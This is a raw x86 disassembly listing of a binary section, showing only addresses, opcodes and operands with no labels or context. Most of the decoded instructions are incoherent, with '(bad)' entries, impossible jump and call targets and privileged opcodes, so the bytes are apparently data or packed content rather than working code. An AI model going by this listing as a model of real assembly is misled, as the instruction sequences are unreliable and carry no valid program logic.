  402639:	or     esp,DWORD PTR [ebx+0x2]
  40263c:	test   eax,0xda02750b
  402641:	cld    
  402642:	addr16 add ch,cl
  402645:	or     ebp,DWORD PTR [ebx+0x630be902]
  40264b:	add    ch,cl
  40264d:	or     al,BYTE PTR [eax+0x2]
  402650:	clc    
  402651:	cld    
  402652:	jnp    0x402656
  402654:	jmp    0xe942c164
  402659:	or     edx,DWORD PTR [ebx+0x2]
  40265c:	jmp    0x42466b
  402661:	jmp    0xe94022e4
  402666:	outs   dx,BYTE PTR ds:[esi]
  402667:	jl     0x402669
  402669:	jmp    0xe94062dc
  40266e:	jg     0x402655
  402670:	add    cl,bh
  402672:	leave  
  402673:	or     DWORD PTR [eax],eax
  402675:	jmp    0xe9405ae8
  40267a:	outs   dx,BYTE PTR ds:[esi]
  40267b:	hlt    
  40267c:	(bad)  
  40267d:	call   0xdd409c01
  402682:	test   eax,0x6ee9005f
  402687:	push   esp
  402688:	add    cl,ch
  40268a:	outs   dx,BYTE PTR ds:[esi]
  40268b:	adc    al,0x0
  40268d:	jmp    0x402692
  402692:	add    BYTE PTR [edi-0x4b],bh
  402695:	add    bl,bh
  402697:	mov    edi,esi
  402699:	(bad)  
  40269a:	call   0xe9408b0d
  40269f:	outs   dx,BYTE PTR ds:[esi]
  4026a0:	and    al,0x0
  4026a2:	jmp    0xe940b626
  4026a7:	jle    0x4026a9
  4026a9:	add    cl,ch
  4026ab:	outs   dx,BYTE PTR ds:[esi]
  4026ac:	add    BYTE PTR [eax],0xe9
  4026af:	outs   dx,BYTE PTR ds:[esi]
  4026b0:	inc    eax
  4026b1:	add    cl,ch
  4026b3:	jg     0x402684
  4026b5:	add    BYTE PTR [ecx-0x16002db7],cl
  4026bb:	outs   dx,BYTE PTR ds:[esi]
  4026bc:	xor    eax,DWORD PTR [eax]
  4026be:	jmp    0xd4401a31
  4026c3:	jle    0x40264a
  4026c5:	add    bl,bl
  4026c7:	sub    ecx,esi
  4026c9:	(bad)  
  4026ca:	call   0xe9407a3d
  4026cf:	push   ds
  4026d0:	adc    eax,DWORD PTR [eax]
  4026d2:	jmp    0xf940ebe8
  4026d7:	jg     0x4026d5
  4026d9:	(bad)  
  4026da:	call   0x4089dd
  4026df:	or     al,0xce
  4026e1:	and    BYTE PTR [eax],al
  4026e3:	fmul   st(6),st
  4026e5:	mov    ds:0xcddc00,al
  4026ea:	add    ah,cl
  4026ec:	int    0x80
  4026ee:	add    ah,cl
  4026f0:	int    0x40
  4026f2:	add    ah,bl
  4026f4:	into   
  4026f5:	loop   0x4026f7
  4026f7:	add    BYTE PTR [eax],al
  4026f9:	add    BYTE PTR [eax],al
  4026fb:	add    ah,cl
  4026fd:	cld    
  4026fe:	add    eax,0x58cdcc00
  402703:	add    ah,cl
  402705:	int    0x18
  402707:	add    BYTE PTR [esi+ecx*8-0x330ff6e],bl
  40270e:	cmp    al,BYTE PTR [eax]
  402710:	mov    ebp,cs
  402712:	js     0x402714
  402714:	mov    ebp,cs
  402716:	cmp    BYTE PTR [eax],al
  402718:	pushf  
  402719:	into   
  40271a:	rol    BYTE PTR [eax],cl
  40271c:	(bad)  
  40271d:	cld    
  40271e:	adc    BYTE PTR [eax],al
  402720:	mov    ebp,cs
  402722:	push   0x28cd8c00
  402727:	add    BYTE PTR [esi+ecx*8-0x4e],bl
  40272b:	add    BYTE PTR [ebp+ecx*8+0x8],bl
  40272f:	add    BYTE PTR [ebp+ecx*8-0x78],cl
  402733:	add    BYTE PTR [ebp+ecx*8+0x48],cl
  402737:	add    BYTE PTR [esi+ecx*8-0xe],bl
  40273b:	add    BYTE PTR [esp+edi*8+0x3],cl
  40273f:	add    BYTE PTR [ebp+ecx*8+0x54],cl
  402743:	add    BYTE PTR [ebp+ecx*8+0x14],cl
  402747:	add    BYTE PTR [ebp+ecx*8+0x1],cl
  40274b:	add    DWORD PTR [edi-0x4],ecx
  40274e:	sub    al,BYTE PTR [eax]
  402750:	or     al,0xcd
  402752:	je     0x402754
  402754:	or     al,0xcd
  402756:	xor    al,0x0
  402758:	sbb    al,0xce
  40275a:	retf   0x7500
  40275d:	retf   0xd0a
  402760:	add    BYTE PTR [eax],al
  402762:	add    BYTE PTR [eax],al
  402764:	add    BYTE PTR [ebp-0x25],dh
  402767:	sti    
  402768:	fs jne 0x402746
  40276b:	sti    
  40276c:	and    al,0x75
  40276e:	(bad)  
  402770:	stos   BYTE PTR es:[edi],al
  402771:	jne    0x40274e
  402773:	sti    
  402774:	add    al,0x75
  402776:	(bad)  
  402778:	test   BYTE PTR [ebp-0x25],dh
  40277b:	sti    
  40277c:	inc    esp
  40277d:	jne    0x40275a
  40277f:	cld    
  402780:	jmp    0xdb75:0x80acb75
  402787:	sti    
  402788:	pop    esp
  402789:	jne    0x402766
  40278b:	sti    
  40278c:	sbb    al,0x75
  40278e:	(bad)  
  402790:	call   0xdb75:0x530aaf75
  402797:	sti    
  402798:	jl     0x40280f
  40279a:	(bad)  
  40279c:	cmp    al,0x75
  40279e:	(bad)  
  4027a0:	fidiv  DWORD PTR [ebp-0x33]
  4027a3:	or     dl,BYTE PTR [edi]
  4027a5:	jne    0x402782
  4027a7:	sti    
  4027a8:	ins    BYTE PTR es:[edi],dx
  4027a9:	jne    0x402786
  4027ab:	sti    
  4027ac:	sub    al,0x75
  4027ae:	frndint 
  4027b0:	mov    edx,0xcfbd975
  4027b5:	jne    0x402790
  4027b7:	sti    
  4027b8:	mov    WORD PTR [ebp-0x27],?
  4027bb:	sti    
  4027bc:	dec    esp
  4027bd:	jne    0x402798
  4027bf:	cld    
  4027c0:	cli    
  4027c1:	jne    0x40278c
  4027c3:	or     al,BYTE PTR [ebx]
  4027c5:	jne    0x4027a0
  4027c7:	sti    
  4027c8:	push   edx
  4027c9:	add    BYTE PTR [eax],al
  4027cb:	add    BYTE PTR [eax],al
  4027cd:	add    BYTE PTR [ebp-0x27],dh
  4027d0:	sti    
  4027d1:	adc    dh,BYTE PTR [ebp-0x4a]
  4027d4:	sti    
  4027d5:	ret    0xac75
  4027d8:	or     ah,BYTE PTR [ebx]
  4027da:	jne    0x4027b5
  4027dc:	sti    
  4027dd:	jb     0x402854
  4027df:	add    ch,cl
  4027e1:	sti    
  4027e2:	inc    edi
  4027e3:	add    ch,cl
  4027e5:	cli    
  4027e6:	xor    eax,DWORD PTR [ebx]
  4027e8:	clc    
  4027e9:	or     BYTE PTR [esi+0x2],ch
  4027ec:	jmp    0xe942bfec
  4027f1:	sti    
  4027f2:	xchg   edi,eax
  4027f3:	add    ch,cl
  4027f5:	cli    
  4027f6:	adc    eax,DWORD PTR [ebx]
  4027f8:	jmp    0xe9429ff8
  4027fd:	sti    
  4027fe:	test   DWORD PTR [edx],0x237fbe9
  402804:	jmp    0xf942fc03
  402809:	or     BYTE PTR [edx+0x2],bh
  40280c:	jmp    0xe942480c
  402811:	sti    
  402812:	pop    DWORD PTR [edx]
  402814:	jmp    0xdd432c13
  402819:	or     BYTE PTR [esi],dh
  40281b:	add    ch,cl
  40281d:	sti    
  40281e:	pop    ds
  40281f:	add    ch,cl
  402821:	sti    
  402822:	dec    edi
  402823:	add    ch,cl
  402825:	cli    
  402826:	mov    ds:0x6608fb02,eax
  40282b:	add    ch,cl
  40282d:	sti    
  40282e:	lar    ebp,cx
  402831:	sti    
  402832:	add    BYTE PTR [eax],al
  402834:	add    BYTE PTR [eax],al
  402836:	add    BYTE PTR [edi+0x23fae902],bl
  40283c:	add    ch,cl
  40283e:	sti    
  40283f:	outs   dx,DWORD PTR ds:[esi]
  402840:	add    ch,cl
  402842:	sti    
  402843:	out    dx,eax
  402844:	add    ecx,ebp
  402846:	sti    
  402847:	mov    edi,0x43fae902
  40284c:	add    bh,cl
  40284e:	or     BYTE PTR [eax+0x2],bh
  402851:	jmp    0xe942cc51
  402856:	sti    
  402857:	mov    eax,DWORD PTR [edx]
  402859:	test   eax,0xcf2afb
  40285e:	fisubr DWORD PTR [ebp+0x13]
  402861:	add    cl,ch
  402863:	push   ds
  402864:	pop    eax
  402865:	add    cl,ch
  402867:	push   cs
  402868:	sbb    BYTE PTR [eax],al
  40286a:	jmp    0xf840e87e
  40286f:	ins    DWORD PTR es:[edi],dx
  402870:	(bad)  
  402871:	(bad)  
  402872:	call   0xe9409075
  402877:	out    dx,al
  402878:	daa    
  402879:	add    cl,ch
  40287b:	out    dx,eax
  40287c:	lahf   
  40287d:	add    cl,ch
  40287f:	fiadd  WORD PTR [edi]
  402881:	add    cl,ch
  402883:	fiadd  WORD PTR [edi+0x47cee900]
  402889:	add    cl,ch
  40288b:	iret   
  40288c:	fild   WORD PTR [eax]
  40288e:	stc    
  40288f:	ins    DWORD PTR es:[edi],dx
  402890:	stc    
  402891:	(bad)  
  402892:	call   0xe9405855
  402897:	scas   al,BYTE PTR es:[edi]
  402898:	out    dx,eax
  402899:	(bad)  
  40289a:	call   0x40289f
  40289f:	add    BYTE PTR [edi+0x6ddd006f],ch
  4028a5:	arpl   WORD PTR [eax],ax
  4028a7:	jmp    0xe940784a
  4028ac:	mov    cs,WORD PTR [edi]
  4028ae:	add    cl,ch
  4028b0:	(bad)  
  4028b1:	scas   eax,DWORD PTR es:[edi]
  4028b2:	add    bl,bh
  4028b4:	ins    DWORD PTR es:[edi],dx
  4028b5:	jmp    0x4028b6
  4028b7:	call   0xe940883a
  4028bc:	outs   dx,BYTE PTR ds:[esi]
  4028bd:	sbb    eax,0x8d6fe900
  4028c2:	add    cl,ch
  4028c4:	pop    esi
  4028c5:	std    
  4028c6:	(bad)  
  4028c7:	call   0xe940a62a
  4028cc:	dec    esi
  4028cd:	cmp    eax,0xcd4fe900
  4028d2:	add    cl,bh
  4028d4:	jnp    0x4028d9
  4028d6:	add    dh,dh
  4028d8:	jae    0x4028dd
  4028da:	add    DWORD PTR [eax],eax
  4028dc:	dec    edi
  4028dd:	add    eax,0x5170011
  4028e2:	add    DWORD PTR [eax],edx
  4028e4:	cmp    eax,0x45000505
  4028e9:	add    eax,0xfb110401
  4028ee:	inc    eax
  4028ef:	add    BYTE PTR [ecx],cl
  4028f1:	sti    
  4028f2:	add    BYTE PTR [eax-0x4],al
  4028f5:	cli    
  4028f6:	add    al,BYTE PTR [eax]
  4028f8:	add    al,0xfb
  4028fa:	add    BYTE PTR [edx],al
  4028fc:	sar    dl,1
  4028fe:	and    BYTE PTR [eax],al
  402900:	enter  0xfa,0x20
  402904:	add    BYTE PTR [eax],al
  402906:	add    BYTE PTR [eax],al
  402908:	add    BYTE PTR [esi-0x39fff706],bh
  40290e:	cli    
  40290f:	add    BYTE PTR [eax],cl
  402911:	sar    dl,cl
  402913:	add    BYTE PTR [eax],0x9c
  402916:	sti    
  402917:	(bad)  
  402918:	(bad)  
  402919:	mov    esp,0xc30001fa
  40291e:	cli    
  40291f:	add    BYTE PTR [ecx],0xcf
  402922:	cli    
  402923:	sbb    BYTE PTR [eax],al
  402925:	xchg   edi,eax
  402926:	cli    
  402927:	add    BYTE PTR [eax],bl
  402929:	mov    ebp,0xc50006fa
  40292e:	cli    
  40292f:	add    BYTE PTR [esi],al
  402931:	xchg   ecx,eax
  402932:	cli    
  402933:	pusha  
  402934:	add    BYTE PTR [ecx+0x7c6000fa],cl
  40293a:	cli    
  40293b:	add    eax,DWORD PTR [eax]
  40293d:	test   dl,bh
  40293f:	add    BYTE PTR [ebx],al
  402941:	push   eax
  402942:	cli    
  402943:	xor    BYTE PTR [eax],al
  402945:	dec    eax
  402946:	cli    
  402947:	add    BYTE PTR [eax],dh
  402949:	ds cli 
  40294b:	or     al,0x0
  40294d:	inc    esi
  40294e:	cli    
  40294f:	add    BYTE PTR [edx+edx*2],cl
  402952:	cli    
  402953:	rol    BYTE PTR [eax],0x1c
  402956:	cli    
  402957:	(bad)  
  402958:	push   DWORD PTR [ebp-0x35]
  40295b:	add    edx,DWORD PTR [ecx]
  40295d:	jne    0x402928
  40295f:	add    eax,DWORD PTR [eax]
  402961:	jne    0x402936
  402963:	add    eax,DWORD PTR [edi]
  402965:	jne    0x402939
  402967:	add    eax,DWORD PTR [esi]
  402969:	jne    0x40294c
  40296b:	add    eax,DWORD PTR ds:0x0
  402971:	add    BYTE PTR [ebp-0x20],dh
  402974:	add    eax,DWORD PTR [esi*2+0x750303d7]
  40297b:	fiadd  WORD PTR [ebx]
  40297d:	add    dh,BYTE PTR [ebp-0x1b]
  402980:	add    eax,DWORD PTR [ecx]
  402982:	jne    0x402930
  402984:	add    eax,DWORD PTR [eax]
  402986:	jne    0x402963
  402988:	add    eax,DWORD PTR [eax]
  40298a:	jne    0x4029c1
  40298c:	adc    eax,DWORD PTR [edi]
  40298e:	push   0x7
  402990:	gs push cs
  402992:	retf   
  402993:	push   eax
  402994:	xor    al,0x9
  402996:	in     al,dx
  402997:	add    eax,ecx
  402999:	ins    DWORD PTR es:[edi],dx
  40299a:	jb     0x4029f8
  40299c:	xlat   BYTE PTR ds:[ebx]
  40299d:	push   0x45
  40299f:	scas   al,BYTE PTR es:[edi]
  4029a0:	test   al,0x63
  4029a2:	int3   
  4029a3:	aaa    
  4029a4:	js     0x402a0a
  4029a6:	adc    ecx,DWORD PTR [ecx+0x477bdb7b]
  4029ac:	mov    ebx,esp
  4029ae:	sbb    al,0xb5
  4029b0:	(bad)  
  4029b2:	xchg   ebp,eax
  4029b3:	bound  ebp,QWORD PTR [edx+edx*8-0x49c01016]
  4029ba:	jl     0x402a2a
  4029bc:	dec    edi
  4029bd:	mov    cl,0x3
  4029bf:	fsub   QWORD PTR [eax]
  4029c1:	mov    eax,0xbef04992
  4029c6:	add    eax,0x88b6f3be
  4029cb:	pop    es
  4029cc:	and    esi,DWORD PTR [eax-0x46ab5e31]
  4029d2:	data16 cld 
  4029d4:	inc    ebx
  4029d5:	mov    esi,0x0
  4029da:	add    cl,bh
  4029dc:	add    ah,BYTE PTR [edi+esi*4-0x18ee16d1]
  4029e3:	and    BYTE PTR [esi-0x48],bl
  4029e6:	cwde   
  4029e7:	and    edi,edx
  4029e9:	mov    BYTE PTR es:[esi-0x80],al
  4029ed:	lahf   
  4029ee:	imul   ebx,DWORD PTR [ecx-0x7164d711],0x66
  4029f5:	jae    0x4029c3
  4029f7:	xchg   edi,eax
  4029f8:	int    0xfd
  4029fa:	mov    ebx,0x30367898
  4029ff:	je     0x4029f7
  402a01:	mov    edi,0x4a5f7b60
  402a06:	punpckhdq mm1,mm0
  402a09:	aam    0xff
  402a0b:	jp     0x402a8a
  402a0d:	mov    cl,0x24
  402a0f:	pop    ebx
  402a10:	pop    es
  402a11:	pop    ds
  402a12:	hlt    
  402a13:	dec    ebp
  402a14:	ds int 0x43
  402a17:	push   ebp
  402a18:	mov    ch,0x3b
  402a1a:	push   ebx
  402a1b:	pop    edx
  402a1c:	mov    al,ds:0xe76e8b8
  402a21:	es mov eax,0x87943779
  402a27:	push   0x7f9702b0
  402a2c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402a2d:	sbb    DWORD PTR [eax+eiz*8-0x1893f2eb],0x40
  402a35:	lahf   
  402a36:	mov    ebx,0xcb29a7de
  402a3b:	rcr    DWORD PTR [esi+0x604a],1
  402a41:	add    BYTE PTR [eax],al
  402a43:	add    BYTE PTR [ebp-0x5dd02bf0],ch
  402a49:	inc    ebp
  402a4a:	jmp    DWORD PTR es:[eax+0x440eb0ae]
  402a51:	xchg   edi,eax
  402a52:	xchg   ebp,eax
  402a53:	adc    al,0x4c
  402a55:	and    al,0x3
  402a57:	add    al,0x43
  402a59:	xor    DWORD PTR [eax],eax
  402a5b:	imul   esp,DWORD PTR [esi-0x2828374d],0x2d5cbfb2
  402a65:	xchg   esi,eax
  402a66:	and    edx,ecx
  402a68:	cmp    cl,BYTE PTR [edi-0x773d8faa]
  402a6e:	iret   
  402a6f:	(bad)  
  402a71:	mov    WORD PTR [eax+0x27fff967],?
  402a77:	icebp  
  402a78:	sahf   
  402a79:	add    eax,0xfdce3b5f
  402a7e:	(bad)
  402a81:	div    DWORD PTR [eax+0x2f5bba6e]
  402a87:	clc    
  402a88:	inc    edx
  402a89:	pop    edx
  402a8a:	pop    eax
  402a8b:	or     BYTE PTR [ebx],0x62
  402a8e:	ror    DWORD PTR [edx+edx*4],0x64
  402a92:	mov    dh,0x59
  402a94:	aaa    
  402a95:	scas   al,BYTE PTR es:[edi]
  402a96:	jbe    0x402a7f
  402a98:	inc    edi
  402a99:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402a9a:	add    DWORD PTR [ebp-0x6a],esi
  402a9d:	mov    al,0x98
  402a9f:	add    ecx,ecx
  402aa1:	mov    ch,0xef
  402aa3:	jo     0x402a98
  402aa5:	nop
  402aa6:	jno    0x402aa6
  402aa8:	add    BYTE PTR [eax],al
  402aaa:	add    BYTE PTR [eax],al
  402aac:	add    bl,ch
  402aae:	xchg   ebx,eax
  402aaf:	push   es
  402ab0:	dec    esp
  402ab1:	ror    BYTE PTR [edx-0x76152561],cl
  402ab7:	call   0x78431a07
  402abc:	mov    ch,0xaf
  402abe:	add    DWORD PTR [edi],ecx
  402ac0:	addr16 (bad) 
  402ac2:	clc    
  402ac3:	xchg   ebp,eax
  402ac4:	rcr    DWORD PTR [esi],1
  402ac6:	cld    
  402ac7:	loopne 0x402a6b
  402ac9:	mov    ebx,DWORD PTR [eax+0x7f]
  402acc:	or     al,0x72
  402ace:	pop    ebp
  402acf:	or     BYTE PTR [esi+0x1a],bh
  402ad2:	xchg   cx,ax
  402ad4:	call   0x126907b
  402ad9:	test   al,0x14
  402adb:	imul   ebp,DWORD PTR [ebx+0x2e],0x65
  402adf:	ins    BYTE PTR es:[edi],dx
  402ae0:	sbb    al,0x84
  402ae2:	cmc    
  402ae3:	fs test edx,esi
  402ae6:	add    eax,0x5061f262
  402aeb:	push   es
  402aec:	ins    BYTE PTR es:[edi],dx
  402aed:	pop    ss
  402aee:	mov    eax,ds:0xb18d1b01
  402af3:	or     BYTE PTR [edx-0xaf03e15],al
  402af9:	pop    edx
  402afa:	pushf  
  402afb:	mov    al,0x65
  402afd:	cld    
  402afe:	lods   al,BYTE PTR ds:[esi]
  402aff:	mov    bh,0x12
  402b01:	jbe    0x402b80
  402b03:	mov    esi,0xb94da08b
  402b08:	cld    
  402b09:	xor    ebx,esp
  402b0b:	fsub   QWORD PTR [edx+0x45]
  402b0e:	jmp    0x402ae9
  402b10:	adc    eax,0x0
  402b15:	add    BYTE PTR [edi],bl
  402b17:	cmp    edx,ebx
  402b19:	mov    WORD PTR [ecx],?
  402b1b:	or     dl,ah
  402b1d:	sti    
  402b1e:	xchg   esp,eax
  402b1f:	pop    edi
  402b20:	mov    dl,0x4d
  402b22:	adc    dl,BYTE PTR [eax]
  402b24:	mov    ch,0x3a
  402b26:	cwde   
  402b27:	(bad)  
  402b28:	mov    ebx,0xbaeebea3
  402b2d:	aam    0x9d
  402b2f:	mov    ds:0x540b4adf,eax
  402b34:	fdivr  DWORD PTR ds:0xa4d1c271
  402b3a:	pop    es
  402b3b:	mov    bl,0xd6
  402b3d:	rol    DWORD PTR [esi+0x204369a7],cl
  402b43:	xchg   edi,eax
  402b44:	outs   dx,BYTE PTR ds:[esi]
  402b45:	xor    al,0x4a
  402b47:	inc    esi
  402b48:	lods   eax,DWORD PTR ds:[si]
  402b4a:	in     al,dx
  402b4b:	jbe    0x402bad
  402b4d:	fisubr DWORD PTR [edi+0x394403ea]
  402b53:	fild   DWORD PTR [edx]
  402b55:	xor    esi,DWORD PTR [ebp-0x70]
  402b58:	aaa    
  402b59:	or     bl,BYTE PTR [edi]
  402b5b:	and    cl,BYTE PTR [eax+0xd]
  402b5e:	dec    eax
  402b5f:	call   DWORD PTR [ebp+eax*1-0x3b]
  402b63:	jne    0x402baa
  402b65:	add    dl,BYTE PTR [edx+0x130af3ab]
  402b6b:	popa   
  402b6c:	and    al,0xc
  402b6e:	cmp    al,0xb6
  402b70:	nop
  402b71:	push   0x6f812caa
  402b76:	xchg   ebp,eax
  402b77:	loop   0x402b28
  402b79:	data16 add BYTE PTR [eax],al
  402b7c:	add    BYTE PTR [eax],al
  402b7e:	add    ah,ch
  402b80:	push   edi
  402b81:	loopne 0x402be4
  402b83:	cmp    edx,ecx
  402b85:	int3   
  402b86:	faddp  st(3),st
  402b88:	arpl   WORD PTR [ebp+0x6bbd4cd9],di
  402b8e:	rol    ch,1
  402b90:	push   cs
  402b91:	pushf  
  402b92:	xlat   BYTE PTR ds:[ebx]
  402b93:	xor    cl,al
  402b95:	or     BYTE PTR [ebx-0x4c07a564],dh
  402b9b:	dec    ebx
  402b9c:	hlt    
  402b9d:	daa    
  402b9e:	mov    ebp,0xba57462a
  402ba3:	mov    ch,0xfa
  402ba5:	xchg   BYTE PTR [eax-0x4069af30],bh
  402bab:	(bad)  
  402bac:	fsubrp st(5),st
  402bae:	mov    dh,0x76
  402bb0:	xor    eax,0xe241b1b5
  402bb5:	inc    edx
  402bb6:	aad    0xcf
  402bb8:	aaa    
  402bb9:	push   edx
  402bba:	rcr    al,cl
  402bbc:	lds    esp,FWORD PTR [ecx]
  402bbe:	fstp   TBYTE PTR [ecx+0x5c]
  402bc1:	icebp  
  402bc2:	(bad)  [esi]
  402bc4:	lods   eax,DWORD PTR ds:[esi]
  402bc5:	(bad)  
  402bc6:	bound  edx,QWORD PTR [esi+0x1640e5e]
  402bcc:	xchg   ecx,eax
  402bcd:	pop    ebp
  402bce:	ins    DWORD PTR es:[edi],dx
  402bcf:	add    BYTE PTR [ebx+0x2d],0x6a
  402bd3:	lar    esi,dx
  402bd6:	mov    edx,0xca7cde73
  402bdb:	ins    BYTE PTR es:[edi],dx
  402bdc:	jne    0x402bec
  402bde:	call   0x0:0x6997fc75
  402be5:	add    BYTE PTR [eax],al
  402be7:	add    BYTE PTR [edx+0x45],dh
  402bea:	lods   eax,DWORD PTR ds:[esi]
  402beb:	jbe    0x402c5f
  402bed:	rcr    BYTE PTR [ebx],cl
  402bef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402bf0:	ins    DWORD PTR es:[edi],dx
  402bf1:	jg     0x402bb4
  402bf3:	aad    0x74
  402bf5:	call   0x59b3f128
  402bfa:	les    esi,FWORD PTR [edx]
  402bfc:	xlat   BYTE PTR ds:[ebx]
  402bfd:	iret   
  402bfe:	xor    ah,BYTE PTR [edx-0x30]
  402c01:	sbb    BYTE PTR [eax+0x5e9a111],0x1
  402c08:	sahf   
  402c09:	pop    eax
  402c0a:	jg     0x402bfa
  402c0c:	inc    esi
  402c0d:	leave  
  402c0e:	or     DWORD PTR [esi],ebx
  402c10:	inc    esi
  402c11:	jp     0x402ba6
  402c13:	dec    ebp
  402c14:	das    
  402c15:	repz sbb al,0x3d
  402c18:	sub    BYTE PTR [eax+0x56],ah
  402c1b:	test   eax,0xd9e0c9bc
  402c20:	mov    ebx,0x2a8a2a78
  402c25:	lock mov bl,0x7a
  402c28:	and    eax,0xcba5d163
  402c2d:	mov    al,0x3f
  402c2f:	jne    0x402bf5
  402c31:	mov    eax,ds:0xaadc6ad
  402c36:	sbb    edx,esi
  402c38:	stos   BYTE PTR es:[edi],al
  402c39:	aaa    
  402c3a:	cwde   
  402c3b:	popa   
  402c3c:	(bad)  
  402c3d:	mov    cl,0x6
  402c3f:	xor    ecx,edi
  402c41:	mov    al,ds:0x7e802b4
  402c46:	and    dl,BYTE PTR [edx]
  402c48:	out    0x3a,eax
  402c4a:	mov    ds:0x1d,eax
  402c4f:	add    BYTE PTR [eax],al
  402c51:	jo     0x402bfd
  402c53:	sub    eax,0x976ced
  402c58:	jg     0x402cad
  402c5a:	add    esi,DWORD PTR [esi]
  402c5c:	or     DWORD PTR [ebx],edi
  402c5e:	inc    BYTE PTR [eax+0x2a]
  402c61:	pushf  
  402c62:	(bad)  
  402c63:	fbstp  TBYTE PTR [ebp+ecx*8-0x10b957a1]
  402c6a:	pop    eax
  402c6b:	xor    eax,edx
  402c6d:	cld    
  402c6e:	pop    eax
  402c6f:	inc    esi
  402c70:	jne    0x402c7a
  402c72:	popa   
  402c73:	retf   
  402c74:	jecxz  0x402c67
  402c76:	pop    edi
  402c77:	mov    esp,0x25570b89
  402c7c:	not    DWORD PTR [eax+0x5a]
  402c7f:	push   edx
  402c80:	jl     0x402c26
  402c82:	test   bl,0xea
  402c85:	mov    ch,0xfb
  402c87:	mov    edx,0x22012750
  402c8c:	mov    esi,0x4754fd54
  402c91:	jo     0x402c1f
  402c93:	(bad)
  402c96:	xchg   BYTE PTR [edx+0x2b8e635b],dh
  402c9c:	in     eax,0xa8
  402c9e:	xchg   ebx,eax
  402c9f:	pop    esp
  402ca0:	mov    gs,WORD PTR ds:0xbc18c2af
  402ca6:	mov    cl,0xb5
  402ca8:	bound  ebx,QWORD PTR [ecx+ebp*4+0x2c]
  402cac:	in     al,dx
  402cad:	or     al,0xa8
  402caf:	pop    ebx
  402cb0:	jns    0x402c6a
  402cb2:	pop    ebp
  402cb3:	fwait
  402cb4:	pop    es
  402cb5:	add    BYTE PTR [eax],al
  402cb7:	add    BYTE PTR [eax],al
  402cb9:	add    bl,al
  402cbb:	(bad)  
  402cbc:	in     al,dx
  402cbd:	push   ebp
  402cbe:	sbb    DWORD PTR [ebp+esi*2-0x1d],ebx
  402cc2:	inc    ecx
  402cc3:	push   ebp
  402cc4:	add    dl,BYTE PTR [eax+0x74]
  402cc7:	stc    
  402cc8:	fisub  WORD PTR [eax+edi*8-0x16]
  402ccd:	ins    BYTE PTR es:[edi],dx
  402cce:	adc    eax,0x65fa71ff
  402cd3:	add    al,BYTE PTR ds:0xbf050e00
  402cd9:	xchg   ebp,eax
  402cda:	shl    BYTE PTR [eax+edi*4],0xe2
  402cde:	cmp    ah,dh
  402ce0:	mov    al,0x7b
  402ce2:	(bad)  
  402ce3:	aad    0xb5
  402ce5:	or     al,0xf7
  402ce7:	dec    eax
  402ce8:	rcl    BYTE PTR [edx-0x1a2a8777],cl
  402cee:	adc    ebp,DWORD PTR [ebx-0x64828324]
  402cf4:	fisttp DWORD PTR [ebx]
  402cf6:	or     BYTE PTR [edi-0x1ff1792d],0xd4
  402cfd:	icebp  
  402cfe:	test   BYTE PTR [esi-0x23],ch
  402d01:	push   0x1fda7f0a
  402d06:	mov    ebx,edx
  402d08:	mov    ebp,0xb9243781
  402d0d:	idiv   BYTE PTR [ebp+0x32]
  402d10:	mov    al,0x6f
  402d12:	add    eax,DWORD PTR [ebx-0x49]
  402d15:	sbb    BYTE PTR [edx+0x17],dh
  402d18:	or     BYTE PTR [eax-0xf0d864],cl
  402d1e:	add    BYTE PTR [eax],al
  402d20:	add    BYTE PTR [eax],al
  402d22:	add    BYTE PTR [esi-0xa],dl
  402d25:	add    eax,0xc6f866
  402d2a:	adc    DWORD PTR [ebx],ebx
  402d2c:	pop    ebp
  402d2d:	gs (bad) 
  402d2f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402d30:	ins    BYTE PTR es:[edi],dx
  402d31:	(bad)  
  402d32:	clc    
  402d33:	das    
  402d34:	mov    esi,0x8d91616b
  402d39:	ins    BYTE PTR es:[edi],dx
  402d3a:	push   ss
  402d3b:	xor    al,0xe0
  402d3d:	or     ah,BYTE PTR [eax-0x28f26f56]
  402d43:	jo     0x402cc6
  402d45:	add    al,0x4e
  402d47:	push   ds
  402d48:	jb     0x402d4d
  402d4a:	cmp    DWORD PTR [ebp-0x1c],ebp
  402d4d:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  402d4f:	jecxz  0x402d25
  402d51:	pop    edi
  402d52:	shl    BYTE PTR [ebp+0x1e],1
  402d55:	aas    
  402d56:	imul   edi,DWORD PTR [eax+edx*4],0x11636e4f
  402d5d:	pop    edx
  402d5e:	ror    ebx,1
  402d60:	addr16 sub dl,dh
  402d63:	lods   al,BYTE PTR ds:[esi]
  402d64:	cmc    
  402d65:	cli    
  402d66:	fidiv  WORD PTR ds:0x4ad80b4b
  402d6c:	mov    BYTE PTR [ebp+0x661eccbc],dl
  402d72:	mov    ebx,0xb2b6ac53
  402d77:	mov    dl,0x42
  402d79:	(bad)  
  402d7a:	mov    ch,0xa5
  402d7c:	(bad)  
  402d7e:	mov    ebp,0xbac25118
  402d83:	aas    
  402d84:	retf   
  402d85:	jb     0x402d3a
  402d87:	add    BYTE PTR [eax],al
  402d89:	add    BYTE PTR [eax],al
  402d8b:	add    BYTE PTR [esi-0x664b5c83],ah
  402d91:	(bad)  
  402d92:	or     eax,0xfe47ffd0
  402d97:	(bad)  
  402d98:	inc    eax
  402d99:	ret    0xde2e
  402d9c:	shl    DWORD PTR [edi+ebx*2],0xd9
  402da0:	push   esi
  402da1:	lods   eax,DWORD PTR ds:[esi]
  402da2:	dec    ecx
  402da3:	data16 out 0x42,al
  402da6:	cmp    ah,BYTE PTR [ecx+0x39]
  402da9:	fldl2e 
  402dab:	addr16 test al,0x2f
  402dae:	sbb    ebp,DWORD PTR [edi+0x4f]
  402db1:	in     al,0x85
  402db3:	or     eax,ecx
  402db5:	jns    0x402e2c
  402db7:	or     al,0xb6
  402db9:	iret   
  402dba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402dbb:	add    eax,0x2d6264f
  402dc0:	nop
  402dc1:	fild   DWORD PTR [ebx]
  402dc3:	add    BYTE PTR [ebp+0x1a],dh
  402dc6:	adc    eax,0x61596c1b
  402dcb:	xchg   DWORD PTR ss:[eax+0x28e2d32],ebx
  402dd2:	in     eax,dx
  402dd3:	ror    BYTE PTR [ecx+0x5e],0x24
  402dd7:	shr    BYTE PTR [edx],1
  402dd9:	inc    edi
  402dda:	outs   dx,DWORD PTR ds:[esi]
  402ddb:	sahf   
  402ddc:	dec    edi
